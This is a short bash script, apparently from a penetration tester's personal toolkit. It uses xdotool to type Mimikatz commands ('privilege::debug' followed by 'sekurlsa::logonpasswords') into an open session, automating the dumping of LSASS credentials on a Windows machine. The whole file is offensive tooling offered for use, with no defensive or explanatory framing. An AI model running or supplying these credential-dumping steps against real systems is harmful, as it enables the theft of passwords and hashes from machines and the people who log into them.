#!/bin/bash

: '
Mimikatz: Dump LSASS credentials (remove protection, debug, logonpasswords).
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "privilege::debug"
xdotool key Return
sleep 1

paste_command "sekurlsa::logonpasswords"
xdotool key Return

